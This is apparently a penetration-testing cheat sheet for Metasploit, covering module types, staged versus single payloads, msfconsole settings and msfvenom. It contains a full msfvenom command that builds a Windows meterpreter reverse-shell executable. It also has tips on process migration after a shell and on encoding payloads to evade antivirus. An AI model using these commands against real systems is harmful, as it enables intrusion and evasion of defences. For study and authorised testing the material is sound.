# 🛠️ Metasploit Framework (MSF)

> **Category:** Exploitation & Post-Exploitation Framework

## 📋 Module Types
| Module | Purpose | Example |
| :--- | :--- | :--- |
| **Exploits** | Leveraging a vulnerability to run code. | `exploit/windows/smb/ms17_010_eternalblue` |
| **Scanners** | Recon and vulnerability identification. | `auxiliary/scanner/portscan/tcp` |
| **Payloads** | The code that executes on the target. | `windows/x64/meterpreter/reverse_tcp` |
| **Post** | Post-exploitation tasks (hash dumping, etc). | `post/windows/gather/smart_hashdump` |

---

## 📡 Payload Architecture: Singles vs. Staged

### 1. Singles (Inline)
*   **Nature**: Self-contained. The entire payload is sent in one go.
*   **Naming**: `windows/shell_reverse_tcp` (Uses underscores `_`).
*   **Pros**: More stable; requires no additional network connection.

### 2. Staged
*   **Nature**: Split into two parts.
    1.  **Stager**: Small code that establishes a connection.
    2.  **Stage**: Larger functional code (like Meterpreter) downloaded after the stager connects.
*   **Naming**: `windows/shell/reverse_tcp` (Uses slashes `/`).
*   **Pros**: Can fit into smaller memory "holes" during exploitation.

---

## ⚙️ Variables & Configuration
Use `msfconsole` to manage your environment:
*   `set RHOSTS <IP>`: Sets the target (Remote Host).
*   `set LHOST <IP>`: Sets your local IP for the reverse connection.
*   `setg <VAR> <VAL>`: **Global Set**. Applies the value to all modules (e.g., `setg LHOST tun0`).
*   `show options`: Displays required settings for the current module.

---

## 🐍 msfvenom: Custom Payload Generation
The standalone tool for generating shellcode and executables.

**Basic Syntax:**
`msfvenom -p [payload] LHOST=[IP] LPORT=[PORT] -f [format] -o [output_file]`

| Format | Output Type | Use Case |
| :--- | :--- | :--- |
| `-f exe` | Windows Executable | Standard binary execution. |
| `-f psh` | PowerShell Script | Script-based execution (stealthier). |
| `-f raw` | Raw Shellcode | Used for manual buffer overflow exploitation. |

**Example (Windows Reverse Shell EXE):**
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe`

---

## 💡 Expert Tips
*   **Check First**: Always run the `check` command inside `msfconsole` before launching an exploit. It tests if the target is vulnerable without actually exploiting it.
*   **Auto-Run Scripts**: Use `set AutoRunScript post/windows/manage/migrate` to automatically move your process to a more stable one (like `explorer.exe`) the moment you get a shell.
*   **Encoding with msfvenom**: Add `-e x86/shikata_ga_nai -i 5` to encode your payload 5 times to try and evade basic AV signatures.
